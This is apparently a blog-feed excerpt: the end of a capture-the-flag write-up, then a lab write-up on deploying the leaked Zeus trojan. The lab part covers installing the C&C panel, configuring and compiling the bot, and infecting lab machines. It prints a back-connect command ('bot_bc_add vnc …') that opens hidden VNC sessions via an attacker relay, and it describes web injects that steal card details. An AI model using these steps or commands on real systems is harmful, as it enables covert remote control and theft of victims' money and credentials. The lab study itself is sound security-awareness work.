</span><span class='line'><span class="o">[</span>root@Relativity jetta<span class="o">]</span><span class="c"># locate flag.txt</span>
</span><span class='line'>locate flag.txt
</span><span class='line'>/root/flag.txt
</span><span class='line'><span class="o">[</span>root@Relativity jetta<span class="o">]</span><span class="c"># cat /root/flag.txt</span>
</span><span class='line'>cat /root/flag.txt
</span><span class='line'>65afa0e5928b98f7ae283e16df2d43bf
</span><span class='line'><span class="o">[</span>root@Relativity jetta<span class="o">]</span><span class="c">#</span>
</span></code></pre></td></tr></table></div></figure>


<p>As you can see, flag.txt was found by simply using the locate command for the file. Because I am now root, I have no troubles reading it, and as such, the challenge was considered completed!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Zeus - My Adventure with a Infamous Bot]]></title>
    <link href="http://leonjza.github.io/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot/"/>
    <updated>2013-09-23T14:21:00+02:00</updated>
    <id>http://leonjza.github.io/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot</id>
    <content type="html"><![CDATA[<h6>var disclaimer = require(&lsquo;standard_disclaimer.js&rsquo;);</h6>

<p><strong>NOTE! THIS IS FOR EDUCATIONAL PURPOSES ONLY. CHANCES ARE, IF YOU TRY THIS WITHOUT PERMISSION, YOU WILL GET CAUGHT AND GET THROWN INTO A DARK PLACE WITH NO INTERNET AND A ANGRY NATIVE WITH A BIG STICK &ndash; ALONE</strong></p>

<h3>Bots for the masses.</h3>

<p>Recently at a conference that I attended, I sat in a class that was talking about Botnets and general &lsquo;How Easy They Are&rsquo; related things. 90% of the technical discussions did not really come as a surprise to me, however, I came to realize that I am not <strong>100%</strong> aware of how ( and I dare say this lightly ) <em>easy</em> they have it. The technical competency of the adversary really doesn&rsquo;t have to be at a jaw droppingly high level. In fact, if you can operate the keyboard and mouse, heck, even a tablet/phone once its all setup, then you could potentially be a successful botnet operator.</p>

<!--more-->


<h3>So, botnet?</h3>

<p>In its simplest form, a bot, from an attackers perspective, is simply a part of a larger resource network. A number, that if not available, does not really matter as there are many more that form part of the larger botnet. A very well known botnet is the <a href="http://en.wikipedia.org/wiki/Zeus_(Trojan_horse)">Zeus botnet</a>. Popular for its ability to perform credential theft, it was sold from what appears to range from $700 to $15000, depending on the extra <em>features</em> that you&rsquo;d like. Some of these features include the ability to connect via VNC to a remote host in order to graphically control it.</p>

<p>So for $700, you can buy a relatively easy to setup piece of software that would allow you to <em>steal</em> credentials from random victims. This activity is only one part of a larger cybertheft cycle. The wikipedia article <a href="http://en.wikipedia.org/wiki/Zeus_(Trojan_horse)">here</a> does a excellent job to describe the process in a image:</p>

<p><img src="http://upload.wikimedia.org/wikipedia/en/2/2d/FBI_Fraud_Scheme_Zeus_Trojan.jpg"></p>

<h3>The Zeus Bot Architecture</h3>

<p>The Zeus bot client side software is a windows only piece of malware. Typically infection would occur via a <a href="http://en.wikipedia.org/wiki/Drive-by_download">drive-by download</a> (which is the scariest and possibly most stealthy form of infection), or via other means such as facebook posts, phishing sites etc, enticing the user to run an arbitrary executable. Of course, infection is not limited to these methods. Simply getting access to a computer, plugging in your thumbdrive and running the bot software is a completely valid form of infection.</p>

<p>Once infection is successful, the client runs silently on the victim PC, masking itself as much as possible. The client would have a time configured that tells it how often it should update the Command and Control server with new collected information, as well as dynamic configuration updates, new commands it should run and keep-alive check-ins.</p>

<h3>Zeus Source Leaked</h3>

<p>The full Zeus bot sources <a href="https://www.csis.dk/en/csis/blog/3229/">leaked</a> around March 2011, and a Github repo of it was made <a href="https://github.com/Visgean/Zeus">here</a>. This allowed any one in the public to dissect, inspect and test the Malware. This was probably not a good thing for the malware authors&#8217; business :). However, now, anyone is able to grab the sources, modify it as required and use. It leads to the possibility of even more sophistication in a already successful botnet, such as adding peer-to-peer communications with C&amp;C servers instead of relying on HTTP as can be seen in <a href="http://www.cert.pl/PDF/2013-06-p2p-rap_en.pdf">this</a> excellent analysis by <a href="https://twitter.com/CERT_Polska_en">@CERT_Polska_en</a>.</p>

<h3>LAB Time!</h3>

<p>Now that we have the full sources, I decided it&rsquo;s time to setup a LAB to configure and play with this bot.</p>

<p>I have a KVM Server at my disposal, and figured it will be a good idea to use that. The basic idea of the lab was to have a simulated internet network, a firewall, and a client network that makes use of this &ldquo;Fake Internet&rdquo;. I created 2 isolated networks, configured a set of CentOS 6, and Windows XP clients and a Server 2008 R2 Server.</p>

<p>In short, the lab was going to look something like this:</p>

<figure class='code'><figcaption><span>Internal Zeus LAB</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>                         Virtual Machine Management Interface
</span><span class='line'>                         +-----------------------------------&gt;
</span><span class='line'>                                   <span class="p">|</span>
</span><span class='line'>                                   <span class="p">|</span>
</span><span class='line'>                                   <span class="p">|</span>
</span><span class='line'>                              +----+---------+
</span><span class='line'>                              <span class="p">|</span>              <span class="p">|</span>
</span><span class='line'>                  +-----------+  Firewall    +-----------+
</span><span class='line'>                  <span class="p">|</span>           <span class="p">|</span>              <span class="p">|</span>           <span class="p">|</span>
</span><span class='line'>                  <span class="p">|</span>           +--------------+           <span class="p">|</span>
</span><span class='line'>                  <span class="p">|</span>                                      <span class="p">|</span>                 +----------+
</span><span class='line'>                  <span class="p">|</span>                  ^                   <span class="p">|</span>              +--<span class="p">|</span> Victim A <span class="p">|</span>
</span><span class='line'>          +---------------+          <span class="p">|</span>           +----------------+     <span class="p">|</span>  +----------+
</span><span class='line'>          <span class="p">|</span>               <span class="p">|</span>          <span class="p">|</span>           <span class="p">|</span>                <span class="p">|</span>     <span class="p">|</span>
</span><span class='line'>          <span class="p">|</span> Fake Internet <span class="p">|</span>          +           <span class="p">|</span>   Fake LAN     +-----+  +----------+
</span><span class='line'>          <span class="p">|</span>               <span class="p">|</span>                      <span class="p">|</span>                <span class="p">|</span>     +--+ Victim B <span class="p">|</span>
</span><span class='line'>          +------+--------+   NAT Towards Fake   +----------------+        +----------+
</span><span class='line'>                 <span class="p">|</span>            Internet Interface
</span><span class='line'>                 <span class="p">|</span>
</span><span class='line'>        +--------+--------+--------------------+----------------+
</span><span class='line'>        <span class="p">|</span>                 <span class="p">|</span>                    <span class="p">|</span>                <span class="p">|</span>
</span><span class='line'>        <span class="p">|</span>                 <span class="p">|</span>                    <span class="p">|</span>                <span class="p">|</span>
</span><span class='line'>        <span class="p">|</span>                 <span class="p">|</span>                    <span class="p">|</span>                +
</span><span class='line'> +------+-----+     +-----+------+      +------+-------+     +-----------------+
</span><span class='line'> <span class="p">|</span>            <span class="p">|</span>     <span class="p">|</span>            <span class="p">|</span>      <span class="p">|</span>              <span class="p">|</span>     <span class="p">|</span>                 <span class="p">|</span>
</span><span class='line'> <span class="p">|</span> Zeus Bot   <span class="p">|</span>     <span class="p">|</span> Zeus Web   <span class="p">|</span>      <span class="p">|</span> Random Victim<span class="p">|</span>     <span class="p">|</span> Compromised     <span class="p">|</span>
</span><span class='line'> <span class="p">|</span> Herder /   <span class="p">|</span>     <span class="p">|</span> based C<span class="p">&amp;</span>C  <span class="p">|</span>      <span class="p">|</span>              <span class="p">|</span>     <span class="p">|</span> Web Server      <span class="p">|</span>
</span><span class='line'> <span class="p">|</span> Controller <span class="p">|</span>     <span class="p">|</span>            <span class="p">|</span>      <span class="p">|</span>              <span class="p">|</span>     <span class="p">|</span>                 <span class="p">|</span>
</span><span class='line'> +------------+     +------------+      +--------------+     +-----------------+
</span></code></pre></td></tr></table></div></figure>


<h3>The Configuration</h3>

<h4>Command &amp; Control</h4>

<p>I figured I&rsquo;d start by checking out the code from the <a href="https://github.com/Visgean/Zeus/">git</a> repo onto the server I would use as the command and control server. So, off I went and <code>git clone https://github.com/Visgean/Zeus.git</code>&rsquo;d the Zeus code into a local directory of my C&amp;C server.</p>

<p>The folder structure of the directory <code>output</code> that is of interest, on disk, looked something like this:</p>

<figure class='code'><figcaption><span>Zeus Sources FOlder Structure</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Zeus/output
</span><span class='line'>├── builder
</span><span class='line'>├── other
</span><span class='line'>├── server
</span><span class='line'>└── server<span class="o">[</span>php<span class="o">]</span>
</span><span class='line'>    ├── install
</span><span class='line'>    ├── system
</span><span class='line'>    └── theme
</span></code></pre></td></tr></table></div></figure>


<p>We can see there is a <code>server[php]</code> directory, which is rather obvious that this is the web interface code. Quick inspection of the sources revealed that the common directory index <code>index.php</code> is in fact empty. So, should someone stumble upon the C&amp;C directory, a blank page will be displayed to the user.</p>

<p>Two other files also exist in the php server root, namely <code>cp.php</code> and <code>gate.php</code>. <code>cp.php</code> is the user control panel to manage the bots, whereas <code>gate.php</code> is the script that all the bots will use to communicate with the C&amp;C. That being said, inspecting network traffic should reveal a lot of talking with <code>gate.php</code>. As a side note, the comments in the sources are in Russian, which makes for a interesting time with Google Translate to read them ;)</p>

<p>So, I copied the sources for <code>server[php]</code> to a web folder <code>z/</code>, fixed up the SELinux contexts for them and tried to access the <code>cp.php</code> page. Bam, server error.</p>

<figure class='code'><figcaption><span>Zeus cp.php mb_internal_encoding error</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>Mon Sep 23 10:57:45 2013<span class="o">]</span> <span class="o">[</span>error<span class="o">]</span> <span class="o">[</span>client 172.16.50.1<span class="o">]</span> PHP Fatal error:  Call to undefined <span class="k">function </span>mb_internal_encoding<span class="o">()</span> in /var/www/html/z/system/global.php on line 1
</span></code></pre></td></tr></table></div></figure>


<p>It was pretty obvious I was missing <code>php-mbstring</code>, so I went and installed it and restarted Apache. Now, loading my <code>cp.php</code>, I was greeted with a polite message asking me how I am :D</p>

<p><img src="http://i.imgur.com/cCgsLBk.png"></p>

<h4>Installing the Command &amp; Control</h4>

<p>I noticed a install folder in the obtained sources and browsed to <code>install/</code> and found a very nice, easy to understand installer:</p>

<p><img src="http://i.imgur.com/e1fYvPG.png"></p>

<p>Here I realized I needed to have a mysql server running, so I proceeded to install that too and create a database <code>cpdb</code> for the control panel. From here, it was literally a case of install and login. We now have a working Zeus command and control server. That really was not so hard was it? In fact, its worryingly easy.</p>

<p><img src="http://i.imgur.com/La5zzZI.png"></p>

<h4>Compiling the Bot</h4>

<p>With that out of the way, the next step had to be to compile the Zeus bot binary with which we will be infecting the Lab of fake LAN clients. For this a Windows machine was required as the tools for this are all windows based. I fired up a Windows XP Virtual Machine, and grabbed a copy of the Zeus code from the Github repository again.</p>

<p>Next, I browsed to the <code>output/builder/</code> folder again and opened the <code>config.txt</code> file in notepad. Here, I really had to set minimal options. One to specify the location of the <code>config.bin</code> and the others for the location of updated bot binaries and what URL the Command and Control server lives at. All pretty straight forward. I also had to set the <code>encryption_key</code>, which should correspond to the key used when we installed the server side PHP stuff earlier.</p>

<p><img src="http://i.imgur.com/xQQeqQl.png"></p>

<p>The next step was to <em>compile</em> the bot. While this may sound complex, it&rsquo;s not. In fact, 2 clicks, granted the config files syntax is correct, and you will have a working compiled exe to work with. The <strong>compiler</strong> interface looked like this:</p>

<p><img src="http://i.imgur.com/f13Baez.png"></p>

<p>1,2,3 done. We now have a <code>zeus-bot.exe</code>. The malware is now customized to speak to my Command &amp; Control server using my unique encryption key. Again, up until this point everything has been pretty easy and straight forward.</p>

<h3>Skipping the creative parts &ndash; Infection.</h3>

<p>From here the infection phase pretty much starts. Of course, the bot herder would need to test hes executables and ensure that they are in working order. There is no point in distributing malware that doesn&rsquo;t work eh. ;D With infection, as previously mentioned anything goes. From drive-by downloads to phishing to physical access to a server. If the machine can execute the bot executable, its job done.</p>

<p>Sadly, I wanted to test the <a href="http://en.wikipedia.org/wiki/Blackhole_exploit_kit">Blackhole Exploit Kit</a>, but the resources on the net appear to be rather scarce. That and the fact that the available versions of it are encoded using a PHP encoder (IonCube), makes it a tad more difficult to get going. It was however interesting to see that the malware authors are limiting they software to IP&rsquo;s along with time restrictions the works. Just like something you&rsquo;d expect to see in commercial software.</p>

<p>As I am kind of the only person using this network, there is no point in trying to fool me into getting the executable run. To make it easy for me to rerun it, I uploaded <code>zeus-bot.exe</code> and the encrypted <code>config.bin</code> to a fake <strong>compromised web server</strong>, ready for download.</p>

<p>I opened Internet Explorer and browsed to the location of <code>zeus-bot.exe</code> and chose <strong>RUN</strong>. To the unsuspecting user, it will appear that nothing happened&hellip;</p>

<h3>From the Bot Herders Perspective</h3>

<p>Assuming the position of the evil bot herder now, I am able to see that I have a new bot connected to my Command &amp; Control server. We can see this in the interface, as well as based on the POST requests to <code>gate.php</code></p>

<figure class='code'><figcaption><span>Apache Logs Extract for POST&#8217;s to gate.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:01 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:06 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:12 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:17 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:22 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:00 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:05 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:10 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:15 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:20 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:23 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:28 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:34 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:39 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:59:44 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:20 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:25 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:30 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:35 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:40 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:45 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:50 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:00:56 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:01 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:07 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:40 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:45 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:50 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:11:01:55 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We are also able to, using the control panel, see some more information based on the newly connected bot:</p>

<p><img src="http://i.imgur.com/aKe4kJh.png"></p>

<p>An interesting thing to note here. It appears that the Zeus bot opens up a socks port on the client machines. If the Command &amp; Control server is able to connect to this IP, and the socks port, then it will be able to pull a screenshot of the current state the client pc is in. This is an <em>almost live</em> image. On the client, we can see that the process <code>explorer.exe</code> is listening in port 35419. This is the same port that the web interface is reporting as the SOCKS port.</p>

<p><img src="http://i.imgur.com/fiy0u2N.png"></p>

<p>In the case of my lab setup, this SOCKS connection was not possible due to the fact that the client is reporting as connected from 172.16.50.2, which is the fake, natted public ip of the lab firewall. The firewall itself is most certainly not listening on that port so the connection would fail. Maybe if I port forwarded the connection back into the fake LAN it would have been able to connect but this I did not test.</p>

<p>So, to test the screen-shotting features, I infected another client on the fake Internet, where the Command &amp; Control server <strong>will</strong> be able to connect to. The result?</p>

<p><img src="http://i.imgur.com/GMqlVCM.png"></p>

<p>There is <strong>no</strong> visual sign of this activity to the user. The user may be busy with some highly confidential work on hes workstation, unaware that an intruder is able to see what he is seeing. You know, like using that secret text file with all your passwords in it.</p>

<h4>But thats not all</h4>

<p>Just being able to <em>see</em> what the user sees is not really enough. No. You also have the ability to remotely VNC into the infected machine. By doing this, the attacker is able to remotely control your computer as you, with one difference, you won&rsquo;t know about it. So lets say he managed to successfully compromise your banking credentials. Instead of triggering alarms on the banks side that a login has just occurred on the other side of the globe, the attacker can now use <strong>your</strong> machine to steal <strong>your</strong> money. From the banks perspective this may appear like a perfectly legitimate transaction.</p>

<p>So lets see how this VNC functionality works.</p>

<h4>Execute the VNC BC Script</h4>

<p>First, the attacker will have to prepare a back connect server and then, via a script, tell the bot to connect to this server so that he may access the botted machine. This architecture is pretty solid. The only thing really that would stop an attacker from succeeding in setting up this back connect is if the remote firewall was to block the port that the attacker has set up on the back connect server. However, things like port 80, or even 443 is almost always opened, so these will be prime candidates to use.</p>

<p>In short, the setup will look something like this.</p>

<figure class='code'><figcaption><span>Back Connect Server</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   --------------------------&gt;        &lt;--------------------------------------------
</span><span class='line'>   --------------------------&gt;        &lt;--------------------------------------------
</span><span class='line'>
</span><span class='line'>   +------------+      +-----------------------+  +--------------+   +------------------+
</span><span class='line'>   <span class="p">|</span>  Attacker  +------&gt;  Back Connect Server  &lt;--+ LAN Firewall &lt;---+ Infected Machine <span class="p">|</span>
</span><span class='line'>   +------------+      +-----------------------+  +--------------+   +------------------+
</span></code></pre></td></tr></table></div></figure>


<p>The back connect server could be any host the attacker has access to and controls. This is also a great way for the attacker that wants to VNC to hide hes IP information. Should you on the infected machine realize what is going on, then you&rsquo;d only see the connection going out to the back connect server, and not the real attacker. The server executable is <code>zsbcs.exe</code> in the <code>output/server/</code> directory and is a windows only tool.</p>

<p>Once the Back Connect Server is setup to listen on one port for new bots, and another for VNC client connections, the attacker would configure a script, instructing the clients where to connect. The script would look something like this:</p>

<figure class='code'><figcaption><span>Back Connect Script</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bot_bc_add vnc 172.16.50.181 9000
</span></code></pre></td></tr></table></div></figure>


<p>This tells the bot where to connect to wait for a VNC session.</p>

<p>Next, the attacker can sit and watch hes Back Connect Server&rsquo;s output and see when a new bot has connected. He may now connect using hes VNC client to the client port of the back connect server and viola, VNC access. Alarmingly, the VNC access is not like your traditional VNC where the user will see the pointer move as the VNC user moves it. No, this VNC session starts in a separate <strong>display</strong>, ensuring that the user is still unaware of what is happening. This for me was the most alarming part. It&rsquo;s almost as if hes attaching to another <em>tty</em>.</p>

<p><img src="http://i.imgur.com/7tg4l2X.png"></p>

<h3>Web Injects, the real threat.</h3>

<p>So all of this Remote Administration Stuff is cool. No doubt they are useful tools for an attacker, but this is not what has made Zeus what it is known for today. Zeus uses what is called <strong>Web Injects</strong> to manipulate website content. &ldquo;What do you mean by &lsquo;manipulation&rsquo;?&rdquo; you may ask. Well, lets assume you are about to buy something online. Generally, the store would ask you for a Credit Card number and an expiry. Usually, on the next page you may be asked for the CVV number. With your machine infected with Zeus, the attacker is able to ask for your Credit Card Number, Expiry, CVV, Email Address, Address, Tel no., secret question etc etc all on one page. The page itself will look totally legit, and again, to the unsuspecting user, this may seem completely normal and away he goes entering hes details. Once submitted, Zeus captures the entire request, including the cookies, the POST data etc etc and based on the bots timer configurations, uploads this information to the Command &amp; Control server. Just like the one we just used to Remotely Administer the infected machines.</p>

<p>With all this information, he may be able to return at a later stage, VNC to your computer and access your account to buy himself some new toys. Because he managed to get hold of your secret question, he finds no trouble in complying to any potential security checks the portal may bring.</p>

<h4>How it works</h4>

